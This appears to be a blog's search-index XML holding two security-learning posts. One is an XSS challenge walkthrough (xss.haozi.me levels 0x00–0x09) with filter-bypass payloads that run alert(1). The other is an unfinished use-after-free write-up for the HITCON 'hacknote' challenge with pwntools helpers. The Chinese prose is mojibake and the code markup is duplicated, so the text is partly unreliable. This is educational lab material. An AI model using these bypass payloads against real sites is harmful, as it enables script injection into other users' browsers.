<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xss</title>
      <link href="/LawlietLW.github.io/2020/03/10/xss/"/>
      <url>/LawlietLW.github.io/2020/03/10/xss/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ç›´å¾ˆæŠ—æ‹’xssçš„å­¦ä¹ ï¼Œä½†ä¸å­¦ä¸è¡Œï¼Œäº†è§£äº†ä¸€ä¸‹jsçš„åŸºç¡€è¯­æ³•ä»¥åŠä¸€äº›å¸¸ç”¨äº‹ä»¶ä¹‹åï¼Œæ‰¾äº†ä¸€ä¸ª<br>é¶åœºè”ç³»ä¸€ä¸‹ï¼Œè¿™é‡Œè´´å‡ºç½‘å€:<a href="https://xss.haozi.me/" target="_blank" rel="noopener">xssé¶åœº</a><br>#0x00</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;div&gt;'</span> + input + <span class="hljs-string"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;div&gt;'</span> + input + <span class="hljs-string">'</div>'</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤,ç›´æ¥æ‰“</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;<span class="hljs-regexp"><code class="language-hljs js">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;<span class="hljs-regexp">/script></span><br></code></pre></td></tr></tbody></table></figure><p>#0x01</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;textarea&gt;'</span> + input + <span class="hljs-string"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;textarea&gt;'</span> + input + <span class="hljs-string">'</textarea>'</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>é—­åˆ<code>&lt;/textarea&gt;</code>æ ‡ç­¾å³å¯</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">&lt;<span class="hljs-regexp"><code class="language-hljs js">&lt;<span class="hljs-regexp">/textarea><script>alert(1)</</span>script><br></code></pre></td></tr></tbody></table></figure><p>#0x02</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;input type="name" value="'</span> + input + <span class="hljs-string"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;input type="name" value="'</span> + input + <span class="hljs-string">'">'</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>åŒæ ·é—­åˆå³å¯</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-string"><code class="language-hljs js"><span class="hljs-string">"><script>alert(1)</script></span><br></code></pre></td></tr></tbody></table></figure><p>#0x03</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()]/g</span><br>  input = input.replace(stripBracketsRe, <span class="hljs-string">''</span>)<br>  <span class="hljs-keyword"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()]/g</span><br>  input = input.replace(stripBracketsRe, <span class="hljs-string">''</span>)<br>  <span class="hljs-keyword">return</span> input<br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å…³å°†<code>()</code>æ›¿æ¢ä¸ºç©ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨htmlå®ä½“è¿›è¡Œç»•è¿‡<br>htmlå®ä½“çš„è¡¨ç¤ºæ–¹æ³•å°±æ˜¯è¯¥<code>&amp;#</code>åŠ ä¸Šè¯¥å­—ç¬¦çš„16è¿›åˆ¶æˆ–åè¿›åˆ¶ASCIIç å†è¡¥ä¸Šä¸€ä¸ª<code>;</code><br><code>&lt;svg&gt;</code>æ ‡ç­¾åˆ™ä¼šæ‰§è¡Œhtmlå®ä½“</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="hljs-symbol">&amp;#40;</span>1<span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs js">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="hljs-symbol">&amp;#40;</span>1<span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>></span></span><br></code></pre></td></tr></tbody></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥ç”¨åå¼•å·åŒ…å›´æ•°å­—</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert <span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs js">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert <span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>></span></span><br></code></pre></td></tr></tbody></table></figure><p>#0x04</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()`]/g</span><br>  input = input.replace(stripBracketsRe, <span class="hljs-string">''</span>)<br>  <span class="hljs-keyword"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()`]/g</span><br>  input = input.replace(stripBracketsRe, <span class="hljs-string">''</span>)<br>  <span class="hljs-keyword">return</span> input<br>}<br></code></pre></td></tr></tbody></table></figure><p>äº‹å®ä¸Šè¿™ä¸€é¢˜æ‰åº”è¯¥ç”¨åˆ°htmlå®ä½“ï¼Œå› ä¸ºè¿™ä¸€é¢˜é™¤äº†è¿‡æ»¤æ‹¬å·ä»¥å¤–è¿˜è¿‡æ»¤äº†åå¼•å·</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="hljs-symbol">&amp;#40;</span>1<span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs js">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="hljs-symbol">&amp;#40;</span>1<span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>></span></span><br></code></pre></td></tr></tbody></table></figure><p>#0x05</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  input = input.replace(<span class="hljs-regexp">/--&gt;/g</span>, <span class="hljs-string">'ğŸ˜‚'</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;!-- '</span> + input + <span class="hljs-string"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  input = input.replace(<span class="hljs-regexp">/--&gt;/g</span>, <span class="hljs-string">'ğŸ˜‚'</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;!-- '</span> + input + <span class="hljs-string">' -->'</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€é¢˜ä¼šå°†è¾“å…¥åŒ…å›´åœ¨æ³¨é‡Šé‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é—­åˆæ³¨é‡Š<br>è€Œ<code>--&gt;</code>åˆä¼šè¢«æ›¿æ¢ä¸ºç¬‘è„¸<br>htmlæ³¨é‡Šæ”¯æŒä»¥ä¸‹ä¸¤ç§å½¢å¼</p><figure class="hljs highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs html"><span class="hljs-comment">&lt;!-- xxx --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!-</span> <span class="hljs-attr">xxx</span> <span class="hljs-attr"><code class="language-hljs html"><span class="hljs-comment">&lt;!-- xxx --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!-</span> <span class="hljs-attr">xxx</span> <span class="hljs-attr">-</span>!></span> ä»¥!å¼€å¤´ï¼Œ!ç»“å°¾çš„å¯¹ç§°æ³¨é‡Šçš„å½¢å¼<br></code></pre></td></tr></tbody></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨<code>--!&gt;</code>æ¥é—­åˆ<code>&lt;!--</code></p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs js">--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>></span></span><br></code></pre></td></tr></tbody></table></figure><p>#0x06</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  input = input.replace(<span class="hljs-regexp">/auto|on.*=|&gt;/ig</span>, <span class="hljs-string">'_'</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;input value=1 <span class="hljs-subst"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  input = input.replace(<span class="hljs-regexp">/auto|on.*=|&gt;/ig</span>, <span class="hljs-string">'_'</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;input value=1 <span class="hljs-subst">${input}</span> type="text">`</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å…³å°†ä»¥<code>auto</code>æˆ–è€…<code>on</code>å¼€å¤´ä»¥<code>=</code>ç»“å°¾çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸º<code>_</code><br>è¿‡æ»¤äº†æ‰€æœ‰äº‹ä»¶ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¢è¡Œæ¥ç»•è¿‡</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs js">onmouseover<br>=alert(<span class="hljs-number"><code class="language-hljs js">onmouseover<br>=alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></tbody></table></figure><p>#0x07</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">const</span> stripTagsRe = <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span><br><br>  input = input.replace(stripTagsRe, <span class="hljs-string">''</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;article&gt;<span class="hljs-subst"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">const</span> stripTagsRe = <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span><br><br>  input = input.replace(stripTagsRe, <span class="hljs-string">''</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;article&gt;<span class="hljs-subst">${input}</span></article>`</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å…³å°†ç±»ä¼¼äº<xxxx>çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©º<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æµè§ˆå™¨çš„å®¹é”™æ€§æ¥ç»•è¿‡</xxxx></p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-string"><code class="language-hljs js">&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-string">"alert(1)"</span><br></code></pre></td></tr></tbody></table></figure><p>#0x08</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>{<br>  src = src.replace(<span class="hljs-regexp">/&lt;\/style&gt;/ig</span>, <span class="hljs-string">'/* \u574F\u4EBA */'</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`<br>    &lt;style&gt;<br>      <span class="hljs-subst"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>{<br>  src = src.replace(<span class="hljs-regexp">/&lt;\/style&gt;/ig</span>, <span class="hljs-string">'/* \u574F\u4EBA */'</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`<br>    &lt;style&gt;<br>      <span class="hljs-subst">${src}</span><br>    </style><br>  `</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>&lt;/style&gt;</code><br>æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡æ¢è¡Œæ¥ç»•è¿‡</p><figure class="hljs highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs js"><code class="language-hljs js"></style<br>><script>alert(1)</script><br></code></pre></td></tr></tbody></table></figure><p>#0x09</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">let</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span><br>  <span class="hljs-keyword">if</span> (domainRe.test(input)) {<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src="<span class="hljs-subst">${input}</span>"&gt;&lt;/script&gt;`</span><br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-string"><code class="language-hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>{<br>  <span class="hljs-keyword">let</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span><br>  <span class="hljs-keyword">if</span> (domainRe.test(input)) {<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src="<span class="hljs-subst">${input}</span>"&gt;&lt;/script&gt;`</span><br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">'Invalid URL'</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å…³æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²å¿…é¡»ä»¥<code>https://www.segmentfault.com</code>å¼€å¤´<br>æ¥ç€æˆ‘ä»¬åœ¨å¿…å’Œ<code>&lt;script&gt;</code>æ ‡ç­¾å¹¶åœ¨æœ«å°¾æ³¨é‡Šæ‰åé¢çš„å†…å®¹</p><figure class="hljs highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">https:<span class="hljs-comment"><code class="language-hljs js">https:<span class="hljs-comment">//www.segmentfault.com"></script><script>alert(1)</script>//</span><br></code></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †å­¦ä¹ è®°å½•</title>
      <link href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>å¤§éƒ¨åˆ†é¢˜ç›®éƒ½é€‰è‡ªHITCON Training</p><h2 id="UAFæ¼æ´-use-after-free"><a href="#UAFæ¼æ´-use-after-free" class="headerlink" title="UAFæ¼æ´(use after free)"></a>UAFæ¼æ´(use after free)</h2><p>é¡¾åæ€ä¹‰ï¼ŒUAFæ¼æ´çš„æ„æ€å°±æ˜¯åœ¨chunkè¢«freeä¹‹åä¾ç„¶èƒ½å¤Ÿä½¿ç”¨ï¼Œäº§ç”Ÿçš„åŸå› åœ¨äºä½¿ç”¨è¿‡å †å—ä¹‹åæ²¡æœ‰åŠæ—¶å°†å †å—çš„æŒ‡é’ˆç½®nullï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™ä¾ç„¶èƒ½ç‹—ä½¿ç”¨è¯¥å †å—</p><a id="more"></a><p>çœ‹åˆ°é¢˜ç›®</p><h3 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h3><p>å…ˆchecksecèµ°ä¸€æ³¢<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/1.jpg" alt=""><br>32ä½æ–‡ä»¶ï¼Œåªå¼€äº†nxå’Œcanaryï¼Œpartial RELROæ„å‘³ç€gotè¡¨å¯æ”¹<br>è¿è¡Œä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/2.jpg" alt=""><br>å¢åˆ æŸ¥åŠŸèƒ½<br>æ¥ç€IDAåˆ†æ<br>å…ˆçœ‹åˆ°addåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/3.jpg" alt=""><br>é¦–å…ˆmallocä¸€ä¸ª8å­—èŠ‚(å®é™…ä¸Šæ˜¯åˆ†é…äº†16å­—èŠ‚ï¼Œchunkå¤´ä¸¤ä¸ª4å­—èŠ‚ï¼ŒåŠ ä¸Šåˆ†é…çš„å…«å­—èŠ‚ä¸€å…±16ä¸ªå­—èŠ‚)<br>è¿™16ä¸ªå­—èŠ‚çš„åœ°å€å­˜åœ¨notelistè¿™ä¸ªæ•°ç»„ä¸­<br>æ¥ç€ï¼Œåœ¨è¿™16ä¸ªå­—èŠ‚å¤„ï¼Œå‰å…«ä¸ªå­—èŠ‚æ˜¯chunkå¤´ï¼Œæ¥ä¸‹æ¥çš„8ä¸ªå­—èŠ‚å­˜å…¥<code>print_note_content</code>å‡½æ•°æŒ‡é’ˆï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯æ‰“å°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/4.jpg" alt=""><br>åå…«ä¸ªå­—èŠ‚å­˜å…¥æˆ‘ä»¬ç”³è¯·çš„sizeå¤§å°çš„å†…å­˜çš„åœ°å€</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs c">*(_DWORD *)notelist[i] = print_note_content<br>v0 = notelist[i];<br>v0[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><code class="language-hljs c">*(_DWORD *)notelist[i] = print_note_content<br>v0 = notelist[i];<br>v0[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">size</span>);<br></code></pre></td></tr></tbody></table></figure><p>å› æ­¤ï¼Œæ•´ä¸ªnoteçš„ç»“æ„å°±æ˜¯è¿™æ ·</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span> {</span><br>    <span class="hljs-keyword">void</span> (*printnote)();<br>    <span class="hljs-keyword"><code class="language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span> {</span><br>    <span class="hljs-keyword">void</span> (*printnote)();<br>    <span class="hljs-keyword">char</span> *content ;<br>};<br></code></pre></td></tr></tbody></table></figure><p>å†çœ‹åˆ°printå‡½æ•°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/5.jpg" alt=""><br>å…ˆè¾“å…¥åºå·ï¼Œåˆ¤æ–­åºå·æ˜¯å¦ç¬¦åˆï¼Œå¦‚æœç¬¦åˆçš„è¯ï¼Œå†åˆ¤æ–­<code>notelist[v1]</code>æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨çš„è¯å°±è°ƒç”¨<code>printnote()</code>å‡½æ•°æ‰“å°</p><p>å†çœ‹åˆ°deleteå‡½æ•°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/6.jpg" alt=""></p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)notelist[v1] + <span class="hljs-number">1</span>));<br><span class="hljs-built_in"><code class="language-hljs c"><span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)notelist[v1] + <span class="hljs-number">1</span>));<br><span class="hljs-built_in">free</span>(notelist[v1]);<br></code></pre></td></tr></tbody></table></figure><p>freeå¹¶ä¸å½»åº•ï¼ŒæŒ‡é’ˆå¹¶æœªç½®nullï¼Œè¿™å°±æ˜¯æ¼æ´æ‰€åœ¨</p><p>å†™expä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå°è£…å¥½è¦ç”¨åˆ°çš„å‡ ä¸ªå‡½æ•°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">'Note size :'</span>)<br>    io.sendline(str(size))<br>    io.recvuntil(<span class="hljs-string">'Content :'</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">'Note size :'</span>)<br>    io.sendline(str(size))<br>    io.recvuntil(<span class="hljs-string">'Content :'</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br></code></pre></td></tr></tbody></table></figure><p>é¢˜ç›®ä¸­ç»™äº†ä¸€ä¸ªmagicå‡½æ•°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/8.jpg" alt=""><br>çœå»äº†æˆ‘ä»¬æ³„éœ²libcåŸºåœ°å€ä»¥åŠæ„é€ shellçš„åŠŸå¤«<br>é‚£ä¹ˆï¼Œè¯¥æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªå‡½æ•°<br>ç»“åˆuafæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å°†printnoteä¸­è°ƒç”¨çš„print_note_contentå‡½æ•°æ›¿æ¢ä¸ºmagicå‡½æ•°ï¼Œè¿™æ ·å½“æˆ‘ä»¬è°ƒç”¨printnoteå‡½æ•°æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨äº†magicå‡½æ•°<br>å¼€å§‹æ„é€ </p><p>é¦–å…ˆmallocä¸¤ä¸ªå 